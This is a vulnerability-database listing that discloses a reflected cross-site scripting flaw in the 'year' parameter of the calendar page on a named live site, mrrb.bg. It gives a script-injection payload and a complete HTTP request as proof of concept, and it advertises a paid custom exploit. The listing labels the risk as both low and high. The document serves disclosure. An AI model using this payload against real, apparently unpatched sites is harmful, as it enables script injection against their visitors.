---
title: mrrb.bg-APP - XSS-Reflected
url: https://cxsecurity.com/issue/WLB-2026010002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-07
fetch_date: 2026-01-08T03:29:11.328640
---

# mrrb.bg-APP - XSS-Reflected

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **mrrb.bg-APP - XSS-Reflected** **2026.01.07**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: mrrb.bg-APP - XSS-Reflected
## Author: nu11secur1ty
## Date: 01/06/2026
## Vendor: mrrb.bg
## Software: mrrb.bg
## Reference: https://portswigger.net/web-security/cross-site-scripting
## STARTUS: THE ISSUE IS NOT FIXED FOR ONE YEAR AFTER THE REPORT!
## Description:
The value of the `year` request parameter is copied into the value of an HTML tag attribute, which is encapsulated in double quotation marks. The payload fchd2"><script>alert(1)</script>a1mg2 was submitted in the year parameter. This input was echoed unmodified in the application's response.
STATUS: HIGH- Vulnerability
[+]PoC:
```
GET /en/reload-calendar/?month=12&year=2025fchd2%22%3e%3cscript%3ealert(1)%3c%2fscript%3ea1mg2 HTTP/2
Host: www.mrrb.bg
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="143", "Not;A=Brand";v="24", "Google Chrome";v="143"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html, \*/\*; q=0.01
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: GeneralAppGenSession=jqlrr36bq8q2d2ucrpm9o49g25; \_ga=GA1.2.1383633579.1767642035; \_gid=GA1.2.449285359.1767642035; \_gat=1; \_ga\_S2X8R0459V=GS2.2.s1767642035$o1$g1$t1767642039$j56$l0$h0
X-Requested-With: XMLHttpRequest
Referer: https://www.mrrb.bg/en/
```
[+]Custom PoC - Exploit:
```
170 Euro
```
## Link:
[href](https://venvar.gumroad.com/l/fpfywm)
## Demo PoC:
[href](https://www.patreon.com/posts/mrrb-bg-xss-147550429)
## Time spent:
04:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://nu11secur1ty.blogspot.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026010002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top